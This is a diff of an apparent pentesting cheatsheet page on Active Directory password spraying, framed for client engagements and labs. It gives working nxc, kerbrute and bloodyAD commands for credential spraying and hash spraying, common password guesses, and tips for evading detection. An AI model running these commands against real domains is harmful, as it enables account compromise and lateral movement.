@@ -1,510 +1,68 @@
-<!DOCTYPE html>
-<html lang="en-US" dir="ltr" class="">
-<head>
-  <meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Password Spraying | JinPwn</title><meta name="description" content="One password, many users. Stay under lockout. Get creds.">
-<meta name="robots" content="index,follow,max-image-preview:large,max-snippet:-1,max-video-preview:-1">
-<meta name="googlebot" content="index,follow,max-image-preview:large,max-snippet:-1,max-video-preview:-1">
-
-<link rel="canonical" href="https://jinpwn.dev/cheatsheets/active-directory/ad05-password-spraying/">
-<meta property="og:title" content="Password Spraying | JinPwn">
-<meta property="og:description" content="One password, many users. Stay under lockout. Get creds.">
-<meta property="og:type" content="website">
-<meta property="og:url" content="https://jinpwn.dev/cheatsheets/active-directory/ad05-password-spraying/">
-<meta property="og:site_name" content="JinPwn">
-<meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://jinpwn.dev/images/og/og.png">
-<meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:title" content="Password Spraying | JinPwn">
-<meta name="twitter:description" content="One password, many users. Stay under lockout. Get creds.">
-<meta name="twitter:image" content="https://jinpwn.dev/images/og/og.png">
-<meta name="twitter:site" content="@jinpwn">
-<meta name="twitter:creator" content="@jinpwn">
-
-
-<script type="application/ld+json">{"@context":"https://schema.org","@type":"WebPage","description":"One password, many users. Stay under lockout. Get creds.","image":["https://jinpwn.dev/images/og/og.png"],"inLanguage":"en-US","name":"Password Spraying | JinPwn","url":"https://jinpwn.dev/cheatsheets/active-directory/ad05-password-spraying/"}</script>
-
-<meta name="theme-color" content="#111111">
-<link rel="icon" type="image/png" href="/favicon.png">
-
-      <link rel="stylesheet" href="/css/site.min.bbc8db26832d45b71fab2c52bea8e7468ac7f3d71458dff1936b8d5891ff48a8.css" integrity="sha256-u8jbJoMtRbcfqyxSvqjnRorH89cUWN/xk2uNWJH/SKg=" crossorigin="anonymous">
-
-
-        <script src="/js/main.e9594fc927ccbd51f2ef3a698abafb8bbf09dcc796037e0a51eedfb14ca858f4.js" integrity="sha256-6VlPySfMvVHy7zppirr7i78J3MeWA34KUe7fsUyoWPQ=" crossorigin="anonymous" defer></script>
-        <script src="/js/asm-highlight.d74879c0e3b6982d95821f5d83904fa40660a6a7e4a2442cdc4bda545679f540.js" integrity="sha256-10h5wOO2mC2Vgh9dg5BPpAZgpqfkokQs3EvaVFZ59UA=" crossorigin="anonymous" defer></script>
-
-
-</head>
-<body class="">
-  
-
-
-
-
-
-  
-  
-  
-
-
-
-  
-
-<header class="site-header">
-  <nav class="top-nav">
-    <div class="container nav-inner">
-      <div class="nav-left">
-        <a href="/" class="brand-link has-logo" aria-label="Home"><img src="/favicon.png" alt="jinpwn.dev" class="brand-logo" style="--brand-logo-height: 36px;"></a>
-        <div class="nav-links desktop-only">
-          
-    <a href="/">Posts</a>
-    <a href="/posts/">Archive</a>
-    <a href="/cheatsheets/" class="is-current">Cheatsheets</a>
-    <a href="/about/">About</a>
-
-        </div>
-      </div>
-      <div class="nav-actions">
-        <div class="search-anchor" id="search-root" data-search-root>
-          <label class="search-trigger" for="search-input">
-            <span class="search-glyph" aria-hidden="true">
-              <svg viewBox="0 0 24 24">
-                <circle cx="11" cy="11" r="7"></circle>
-                <path d="M20 20L16.65 16.65"></path>
-              </svg>
-            </span>
-            <input id="search-input" type="search" placeholder="Search..." autocomplete="off" spellcheck="false" aria-label="Search posts and cheatsheets">
-            <button type="button" class="search-clear" data-search-clear aria-label="Clear search" hidden>
-              <svg viewBox="0 0 24 24" aria-hidden="true">
-                <path d="M18 6L6 18"></path>
-                <path d="M6 6l12 12"></path>
-              </svg>
-            </button>
-            <span class="search-trigger-shortcut desktop-only" aria-hidden="true">CTRL K</span>
-          </label>
-          <div id="search-dropdown" class="search-dropdown" hidden data-search-index-url="/search-index.json" data-search-runtime-url="/js/search-flex.1b1c225e3d6a2ff08480727a5e3bf93df59715e138fede75b7616d9c75fc4fa7.js">
-  <p class="search-status" data-search-status aria-live="polite">Type to search posts and cheatsheets.</p>
-  <div class="search-results" data-search-results role="listbox" aria-label="Search results">
-    <p class="search-empty">Type to search posts and cheatsheets.</p>
-  </div>
-</div>
-
-        </div>
-        <button class="icon-button mobile-only" type="button" data-search-mobile-toggle aria-label="Search" aria-expanded="false" aria-controls="search-root">
-          <svg viewBox="0 0 24 24" aria-hidden="true">
-            <circle cx="11" cy="11" r="7"></circle>
-            <path d="M20 20L16.65 16.65"></path>
-          </svg>
-        </button>
-        <button class="icon-button mobile-only" type="button" data-mobile-toggle aria-label="Toggle menu" aria-expanded="false" aria-controls="mobile-nav">
-          <svg viewBox="0 0 24 24" aria-hidden="true" data-menu-open-icon>
-            <path d="M3 6h18"></path>
-            <path d="M3 12h18"></path>
-            <path d="M3 18h18"></path>
-          </svg>
-          <svg viewBox="0 0 24 24" aria-hidden="true" data-menu-close-icon hidden>
-            <path d="M18 6L6 18"></path>
-            <path d="M6 6l12 12"></path>
-          </svg>
-        </button>
-      </div>
-    </div>
-    <div id="mobile-nav" class="mobile-nav">
-      
-    <a href="/">Posts</a>
-    <a href="/posts/">Archive</a>
-    <a href="/cheatsheets/" class="is-current">Cheatsheets</a>
-    <a href="/about/">About</a>
-
-    </div>
-  </nav>
-</header>
-
-  
-  <main class="site-main">
-    
-  
-  
-  
-  <article class="container cheatsheet-docs-shell">
-    <div class="cheatsheet-docs-layout">
-      
-        <aside class="cheatsheet-sidebar" aria-label="Active Directory Pentesting navigation">
-    <div class="cheatsheet-sidebar-inner">
-      
-        <a href="/cheatsheets/" class="cheatsheet-sidebar-root">All cheatsheets</a>
-      
-      <a href="/cheatsheets/active-directory/" class="cheatsheet-sidebar-section">Active Directory Pentesting</a>
-      
-        <nav class="cheatsheet-sidebar-nav">
-          <ul class="cheatsheet-sidebar-list">
-            
-              <li>
-                <a href="/cheatsheets/active-directory/00-ad-moc/" class="cheatsheet-sidebar-link">AD MOC</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/active-directory/ad01-enumeration/" class="cheatsheet-sidebar-link">Enumeration</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/active-directory/ad02-bloodhound/" class="cheatsheet-sidebar-link">BloodHound</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/active-directory/ad03-kerberoasting/" class="cheatsheet-sidebar-link">Kerberoasting</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/active-directory/ad04-as-rep-roasting/" class="cheatsheet-sidebar-link">AS-REP Roasting</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/active-directory/ad05-password-spraying/" class="cheatsheet-sidebar-link is-current">Password Spraying</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/active-directory/ad06-llmnr--ntlm-relay/" class="cheatsheet-sidebar-link">LLMNR &amp; NTLM Relay</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/active-directory/ad07-acl-abuse/" class="cheatsheet-sidebar-link">ACL Abuse</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/active-directory/ad08-delegation/" class="cheatsheet-sidebar-link">Delegation</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/active-directory/ad09-adcs-esc1-16/" class="cheatsheet-sidebar-link">ADCS ESC1-16</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/active-directory/ad10-lateral-movement/" class="cheatsheet-sidebar-link">Lateral Movement</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/active-directory/ad11-credential-dumping/" class="cheatsheet-sidebar-link">Credential Dumping</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/active-directory/ad12-dcsync/" class="cheatsheet-sidebar-link">DCSync</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/active-directory/ad13-trust-attacks/" class="cheatsheet-sidebar-link">Trust Attacks</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/active-directory/ad14-persistence/" class="cheatsheet-sidebar-link">Persistence</a>
-              </li>
-            
-          </ul>
-        </nav>
-      
-    </div>
-  </aside>
-      
-      <div class="cheatsheet-docs-main cheatsheet-page-main">
-        <header class="cheatsheet-page-header">
-          <h1>Password Spraying</h1>
-          
-        </header>
-
-        
-          <details class="cheatsheet-mobile-sections">
-    <summary class="cheatsheet-mobile-sections-summary">
-      <span class="cheatsheet-mobile-sections-label">Sections</span>
-      <span class="cheatsheet-mobile-sections-current">Password Spraying</span>
-      <span class="cheatsheet-mobile-sections-caret" aria-hidden="true"></span>
-    </summary>
-    <div class="cheatsheet-mobile-sections-panel">
-      <nav aria-label="Active Directory Pentesting sections">
-        <ul class="cheatsheet-mobile-sections-list">
-          
-            <li>
-              <a href="/cheatsheets/" class="cheatsheet-mobile-sections-link cheatsheet-mobile-sections-root">All cheatsheets</a>
-            </li>
-          
-          <li>
-            <a href="/cheatsheets/active-directory/" class="cheatsheet-mobile-sections-link">Overview</a>
-          </li>
-          
-            <li>
-              <a href="/cheatsheets/active-directory/00-ad-moc/" class="cheatsheet-mobile-sections-link">AD MOC</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/active-directory/ad01-enumeration/" class="cheatsheet-mobile-sections-link">Enumeration</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/active-directory/ad02-bloodhound/" class="cheatsheet-mobile-sections-link">BloodHound</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/active-directory/ad03-kerberoasting/" class="cheatsheet-mobile-sections-link">Kerberoasting</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/active-directory/ad04-as-rep-roasting/" class="cheatsheet-mobile-sections-link">AS-REP Roasting</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/active-directory/ad05-password-spraying/" class="cheatsheet-mobile-sections-link is-current">Password Spraying</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/active-directory/ad06-llmnr--ntlm-relay/" class="cheatsheet-mobile-sections-link">LLMNR &amp; NTLM Relay</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/active-directory/ad07-acl-abuse/" class="cheatsheet-mobile-sections-link">ACL Abuse</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/active-directory/ad08-delegation/" class="cheatsheet-mobile-sections-link">Delegation</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/active-directory/ad09-adcs-esc1-16/" class="cheatsheet-mobile-sections-link">ADCS ESC1-16</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/active-directory/ad10-lateral-movement/" class="cheatsheet-mobile-sections-link">Lateral Movement</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/active-directory/ad11-credential-dumping/" class="cheatsheet-mobile-sections-link">Credential Dumping</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/active-directory/ad12-dcsync/" class="cheatsheet-mobile-sections-link">DCSync</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/active-directory/ad13-trust-attacks/" class="cheatsheet-mobile-sections-link">Trust Attacks</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/active-directory/ad14-persistence/" class="cheatsheet-mobile-sections-link">Persistence</a>
-            </li>
-          
-        </ul>
-      </nav>
-    </div>
-  </details>
-        
-
-        <div class="markdown-content cheatsheet-page-body">
-          <p>One password, many users. Stay under lockout. Get creds.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">DC</span><span class="o">=</span>10.10.11.50
-</span></span><span class="line"><span class="cl"><span class="nv">DOMAIN</span><span class="o">=</span>corp.local
-</span></span></code></pre></div><h2 id="i-lockout-policy-first" data-heading-permalink="true"><span class="heading-content">i. Lockout policy FIRST</span>
-    <a class="heading-permalink" href="#i-lockout-policy-first" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>Spray without checking lockout = locked accounts = client incident. Always read the policy.</p>
-<p>bloodyAD (read directly from domain object):</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bloodyAD -d <span class="nv">$DOMAIN</span> -u <span class="nv">$USER</span> -p <span class="nv">$PASS</span> --host <span class="nv">$DC</span> get object <span class="s2">&#34;DC=corp,DC=local&#34;</span> <span class="se">\
-</span></span></span><span class="line"><span class="cl">  --attr minPwdLength,lockoutThreshold,lockOutObservationWindow,lockoutDuration,maxPwdAge,minPwdAge
-</span></span></code></pre></div><p>Output keys to read:</p>
-<ul>
-<li><code>lockoutThreshold</code> - failed attempts before lockout (0 = no lockout, the dream)</li>
-<li><code>lockOutObservationWindow</code> - time window for counting failures (negative number, divide by -600,000,000 for minutes)</li>
-<li><code>lockoutDuration</code> - how long the account stays locked</li>
-<li><code>minPwdLength</code> - informs password choices</li>
-</ul>
-<p>nxc shortcut:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nxc ldap <span class="nv">$DC</span> -u <span class="nv">$USER</span> -p <span class="nv">$PASS</span> --pass-pol
-</span></span><span class="line"><span class="cl">nxc smb <span class="nv">$DC</span> -u <span class="nv">$USER</span> -p <span class="nv">$PASS</span> --pass-pol
-</span></span></code></pre></div><p>Pre-auth: if lockoutThreshold is 0, spray freely. If it&rsquo;s 5, spray at most 4 attempts per user per window. Always leave a margin of 1.</p>
-<div class="obsidian-callout callout-warning">
-  <div class="obsidian-callout-header">
-    <div class="obsidian-callout-icon" aria-hidden="true">
-      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3Z"></path>
-          <path d="M12 9v4"></path>
-          <path d="M12 17h.01"></path></svg>
-    </div>
-    <span class="obsidian-callout-title">Fine-Grained Password Policies (PSO)</span>
-  </div>
-  <div class="obsidian-callout-body">
-    <p>The default domain policy can be overridden per-group by PSOs. nxc has a module for this:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nxc ldap <span class="nv">$DC</span> -u <span class="nv">$USER</span> -p <span class="nv">$PASS</span> -M pso
-</span></span></code></pre></div><p>Check before spraying privileged users, they often have stricter lockout.</p>
-  </div>
-</div>
-<h2 id="ii-build-a-user-list" data-heading-permalink="true"><span class="heading-content">ii. Build a user list</span>
-    <a class="heading-permalink" href="#ii-build-a-user-list" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>If you don&rsquo;t have creds yet, kerbrute-enum first:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">kerbrute userenum -d <span class="nv">$DOMAIN</span> --dc <span class="nv">$DC</span> /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -o users.valid
-</span></span></code></pre></div><p>With creds:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nxc ldap <span class="nv">$DC</span> -u <span class="nv">$USER</span> -p <span class="nv">$PASS</span> --users-export users.txt
-</span></span><span class="line"><span class="cl"><span class="c1">## or via LDAP filter for active accounts only (exclude disabled, exclude machine accounts):</span>
-</span></span><span class="line"><span class="cl">bloodyAD -d <span class="nv">$DOMAIN</span> -u <span class="nv">$USER</span> -p <span class="nv">$PASS</span> --host <span class="nv">$DC</span> get search <span class="se">\
-</span></span></span><span class="line"><span class="cl">  --filter <span class="s1">&#39;(&amp;(objectClass=user)(!(objectClass=computer))(!(userAccountControl:1.2.840.113556.1.4.803:=2)))&#39;</span> <span class="se">\
-</span></span></span><span class="line"><span class="cl">  --attr samaccountname &gt; users.raw
-</span></span><span class="line"><span class="cl">grep -i samaccountname users.raw <span class="p">|</span> awk <span class="s1">&#39;{print $NF}&#39;</span> &gt; users.txt
-</span></span></code></pre></div><h2 id="iii-nxc-spray" data-heading-permalink="true"><span class="heading-content">iii. nxc spray</span>
-    <a class="heading-permalink" href="#iii-nxc-spray" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>The default behavior is &ldquo;exit on first success&rdquo;. For spraying you almost always want <code>--continue-on-success</code>.</p>
-<p>Single password, many users:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nxc smb <span class="nv">$DC</span> -u users.txt -p <span class="s1">&#39;Winter2024!&#39;</span> --continue-on-success
-</span></span></code></pre></div><p>Multiple passwords against one user (brute force, only when no lockout):</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nxc smb <span class="nv">$DC</span> -u Administrator -p passwords.txt --continue-on-success
-</span></span></code></pre></div><p>One-to-one user:password matching (creds from a breach, no permutation):</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nxc smb <span class="nv">$DC</span> -u users.txt -p passwords.txt --no-bruteforce --continue-on-success
-</span></span></code></pre></div><p>NTLM hash spray (PtH against multiple users):</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nxc smb <span class="nv">$DC</span> -u users.txt -H 8846f7eaee8fb117ad06bdd830b7586c --no-bruteforce --continue-on-success
-</span></span></code></pre></div><p>Throttle to dodge detection (random 2-5 second delay between attempts):</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nxc smb <span class="nv">$DC</span> -u users.txt -p <span class="s1">&#39;Winter2024!&#39;</span> --jitter 2-5 --continue-on-success
-</span></span><span class="line"><span class="cl"><span class="c1">## Hardcoded 3-second delay:</span>
-</span></span><span class="line"><span class="cl">nxc smb <span class="nv">$DC</span> -u users.txt -p <span class="s1">&#39;Winter2024!&#39;</span> --jitter <span class="m">3</span> --continue-on-success
-</span></span></code></pre></div><div class="obsidian-callout callout-warning">
-  <div class="obsidian-callout-header">
-    <div class="obsidian-callout-icon" aria-hidden="true">
-      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3Z"></path>
-          <path d="M12 9v4"></path>
-          <path d="M12 17h.01"></path></svg>
-    </div>
-    <span class="obsidian-callout-title">Auth throttling is per-host</span>
-  </div>
-  <div class="obsidian-callout-body">
-    <p>If you spray multiple DCs with the same user list, each DC counts failures independently. Same user, two failed attempts on two DCs = two failures across the domain (DC replicates lockout counters in modern AD), but jitter is local to your run, not domain-aware. Slow down.</p>
-  </div>
-</div>
-<h2 id="iv-pick-the-protocol" data-heading-permalink="true"><span class="heading-content">iv. Pick the protocol</span>
-    <a class="heading-permalink" href="#iv-pick-the-protocol" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>Some protocols don&rsquo;t fail-lock the account on bad password:</p>
-<ul>
-<li><strong>kerberos (kerbrute)</strong> - pre-auth failures DO count toward lockout in modern AD, but the logs are cleaner</li>
-<li><strong>smb</strong> - counts toward lockout, generates 4625 events</li>
-<li><strong>ldap</strong> - counts toward lockout</li>
-<li><strong>winrm</strong> - counts toward lockout, often less monitored</li>
-<li><strong>rdp</strong> - counts toward lockout, very noisy in logs</li>
-</ul>
-<p>When in doubt, use Kerberos (kerbrute). Pre-auth errors are quieter than 4625 SMB events.</p>
-<p>kerbrute passwordspray:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">kerbrute passwordspray -d <span class="nv">$DOMAIN</span> --dc <span class="nv">$DC</span> users.txt <span class="s1">&#39;Winter2024!&#39;</span>
-</span></span><span class="line"><span class="cl"><span class="c1">## With delay (seconds):</span>
-</span></span><span class="line"><span class="cl">kerbrute passwordspray -d <span class="nv">$DOMAIN</span> --dc <span class="nv">$DC</span> users.txt <span class="s1">&#39;Winter2024!&#39;</span> --delay <span class="m">1000</span>
-</span></span><span class="line"><span class="cl"><span class="c1">## Output to file:</span>
-</span></span><span class="line"><span class="cl">kerbrute passwordspray -d <span class="nv">$DOMAIN</span> --dc <span class="nv">$DC</span> users.txt <span class="s1">&#39;Winter2024!&#39;</span> -o spray.out
-</span></span></code></pre></div><div class="obsidian-callout callout-tip">
-  <div class="obsidian-callout-header">
-    <div class="obsidian-callout-icon" aria-hidden="true">
-      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M8.5 14.5A2.5 2.5 0 0 0 11 12c0-1.38-.5-2-1-3-1.072-2.143-.224-4.054 2-6 .5 2.5 2 4.9 4 6.5 2 1.6 3 3.5 3 5.5a7 7 0 1 1-14 0c0-1.153.433-2.294 1-3a2.5 2.5 0 0 0 2.5 2.5z"></path></svg>
-    </div>
-    <span class="obsidian-callout-title">User format matters</span>
-  </div>
-  <div class="obsidian-callout-body">
-    <p>kerbrute wants <code>samaccountname</code> only (no domain prefix). nxc accepts both <code>user</code> and <code>domain\user</code>. Strip domain prefixes before feeding into kerbrute.</p>
-  </div>
-</div>
-<h2 id="v-password-candidates" data-heading-permalink="true"><span class="heading-content">v. Password candidates</span>
-    <a class="heading-permalink" href="#v-password-candidates" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>Without intel, common patterns in 2026 enterprises:</p>
-<ul>
-<li><code>Season + Year + !</code> → <code>Winter2025!</code>, <code>Summer2026!</code>, <code>Spring2024!</code></li>
-<li><code>Company + 123</code> → <code>Acme123!</code>, <code>Contoso2024</code></li>
-<li><code>Welcome + Year</code> → <code>Welcome2025!</code>, <code>Welcome123!</code></li>
-<li><code>Password + N</code> → <code>Password123</code>, <code>Password1!</code></li>
-<li><code>&lt;Domain shortname&gt;1</code> → for <code>corp.local</code>, try <code>Corp1!</code>, <code>Corp2024!</code></li>
-<li>The min password length + 1 capital + 1 number + 1 special is the lowest-effort policy compliance</li>
-</ul>
-<p>With intel from descriptions, comments, GPP:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nxc ldap <span class="nv">$DC</span> -u <span class="nv">$USER</span> -p <span class="nv">$PASS</span> --get-desc-users
-</span></span><span class="line"><span class="cl">bloodyAD -d <span class="nv">$DOMAIN</span> -u <span class="nv">$USER</span> -p <span class="nv">$PASS</span> --host <span class="nv">$DC</span> get search <span class="se">\
-</span></span></span><span class="line"><span class="cl">  --filter <span class="s1">&#39;(description=*)&#39;</span> --attr samaccountname,description <span class="p">|</span> grep -iE <span class="s1">&#39;pass|temp|init|defaul&#39;</span>
-</span></span></code></pre></div><h2 id="vi-reused-passwords-across-local--domain" data-heading-permalink="true"><span class="heading-content">vi. Reused passwords across local + domain</span>
-    <a class="heading-permalink" href="#vi-reused-passwords-across-local--domain" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>Once you have a domain password, spray it as a LOCAL account too. Admins often reuse:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nxc smb 10.10.11.0/24 -u Administrator -p <span class="s1">&#39;CrackedPass1!&#39;</span> --local-auth --continue-on-success
-</span></span></code></pre></div><p>This finds every machine where the local Administrator password equals the cracked domain password. Without LAPS, this is shockingly common.</p>
-<h2 id="vii-reverse-spray-one-user-many-hashes" data-heading-permalink="true"><span class="heading-content">vii. Reverse spray (one user, many hashes)</span>
-    <a class="heading-permalink" href="#vii-reverse-spray-one-user-many-hashes" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>When you have a single high-value username and a database of leaked hashes:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nxc smb <span class="nv">$DC</span> -u Administrator -H hashes.txt --no-bruteforce --continue-on-success
-</span></span></code></pre></div><p>Useful when you found a hash dump (an old breach DB, a cache file) and want to test all hashes against one privileged account.</p>
-<h2 id="viii-after-a-hit" data-heading-permalink="true"><span class="heading-content">viii. After a hit</span>
-    <a class="heading-permalink" href="#viii-after-a-hit" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>Mark the user owned, re-collect BloodHound, check what new paths open up:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nxc smb <span class="nv">$DC</span> -u found_user -p <span class="s1">&#39;FoundPass!&#39;</span> --shares
-</span></span><span class="line"><span class="cl">nxc winrm <span class="nv">$DC</span> -u found_user -p <span class="s1">&#39;FoundPass!&#39;</span>
-</span></span><span class="line"><span class="cl">bloodyAD -d <span class="nv">$DOMAIN</span> -u found_user -p <span class="s1">&#39;FoundPass!&#39;</span> --host <span class="nv">$DC</span> get writable --bh
-</span></span></code></pre></div><p>Then spray that password against the rest of the domain:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nxc smb <span class="nv">$DC</span> -u users.txt -p <span class="s1">&#39;FoundPass!&#39;</span> --continue-on-success
-</span></span></code></pre></div><p>Reuse is the rule, not the exception. If one user has password X, expect 5-10 more to share it.</p>
-<h2 id="ix-opsec" data-heading-permalink="true"><span class="heading-content">ix. OpSec</span>
-    <a class="heading-permalink" href="#ix-opsec" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<ul>
-<li>Every failed login is a 4625 (interactive) or 4771 (Kerberos pre-auth fail) event on the DC</li>
-<li>Spray slowly, one password per user per lockout-window-minus-margin</li>
-<li>Use kerbrute when possible, less noisy than nxc on SMB</li>
-<li>Rotate sources if you can pivot through multiple hosts</li>
-<li>Avoid spraying weekends, traffic anomalies stand out more</li>
-<li>On HTB and labs, lockout is usually disabled, fire as fast as you want</li>
-</ul>
-
-        </div>
-
-        
-          <nav class="cheatsheet-pager is-split" aria-label="Sibling cheatsheet navigation"><a class="cheatsheet-pager-link is-prev" href="/cheatsheets/active-directory/ad04-as-rep-roasting/">
-            <div class="cheatsheet-pager-copy">
-              <span class="cheatsheet-pager-label">Previous</span>
-              <span class="cheatsheet-pager-title">AS-REP Roasting</span>
-            </div>
-            <span class="cheatsheet-pager-arrow" aria-hidden="true">
-              <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" class="cheatsheet-pager-icon" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
-    <path d="m12 19-7-7 7-7"></path>
-    <path d="M19 12H5"></path>
-  </svg>
-            </span>
-          </a><a class="cheatsheet-pager-link is-next" href="/cheatsheets/active-directory/ad06-llmnr--ntlm-relay/">
-            <div class="cheatsheet-pager-copy">
-              <span class="cheatsheet-pager-label">Next</span>
-              <span class="cheatsheet-pager-title">LLMNR &amp; NTLM Relay</span>
-            </div>
-            <span class="cheatsheet-pager-arrow" aria-hidden="true">
-              <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" class="cheatsheet-pager-icon is-next" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
-    <path d="m12 19-7-7 7-7"></path>
-    <path d="M19 12H5"></path>
-  </svg>
-            </span>
-          </a></nav>
-        
-      </div>
-    </div>
-  </article>
-  
-
-  </main>
-  <button class="scroll-top-button" type="button" data-scroll-top aria-label="Scroll to top" aria-hidden="true" tabindex="-1">
-    <svg viewBox="0 0 24 24" aria-hidden="true">
-      <path d="M12 18V6"></path>
-      <path d="M6.75 11.25 12 6l5.25 5.25"></path>
-    </svg>
-  </button>
-  <footer class="site-footer">
-  <p>&copy; 2026 JinPwn</p>
-</footer>
-
-</body>
-</html>
+<!doctype html><html lang=en-US dir=ltr><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><title>Password Spraying | JinPwn</title><meta name=description content="One password, many users. Stay under lockout. Get creds."><meta name=robots content="index,follow,max-image-preview:large,max-snippet:-1,max-video-preview:-1"><meta name=googlebot content="index,follow,max-image-preview:large,max-snippet:-1,max-video-preview:-1"><link rel=canonical href=https://jinpwn.dev/cheatsheets/active-directory/ad05-password-spraying/><meta property="og:title" content="Password Spraying | JinPwn"><meta property="og:description" content="One password, many users. Stay under lockout. Get creds."><meta property="og:type" content="website"><meta property="og:url" content="https://jinpwn.dev/cheatsheets/active-directory/ad05-password-spraying/"><meta property="og:site_name" content="JinPwn"><meta property="og:locale" content="en_US"><meta property="og:image" content="https://jinpwn.dev/images/og/og.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:title content="Password Spraying | JinPwn"><meta name=twitter:description content="One password, many users. Stay under lockout. Get creds."><meta name=twitter:image content="https://jinpwn.dev/images/og/og.png"><meta name=twitter:site content="@jinpwn"><meta name=twitter:creator content="@jinpwn"><script type=application/ld+json>{"@context":"https://schema.org","@type":"WebPage","description":"One password, many users. Stay under lockout. Get creds.","image":["https://jinpwn.dev/images/og/og.png"],"inLanguage":"en-US","name":"Password Spraying | JinPwn","url":"https://jinpwn.dev/cheatsheets/active-directory/ad05-password-spraying/"}</script><meta name=theme-color content="#111111"><link rel=icon type=image/png href=/favicon.png><link rel=stylesheet href=/css/site.min.bbc8db26832d45b71fab2c52bea8e7468ac7f3d71458dff1936b8d5891ff48a8.css integrity="sha256-u8jbJoMtRbcfqyxSvqjnRorH89cUWN/xk2uNWJH/SKg=" crossorigin=anonymous><script 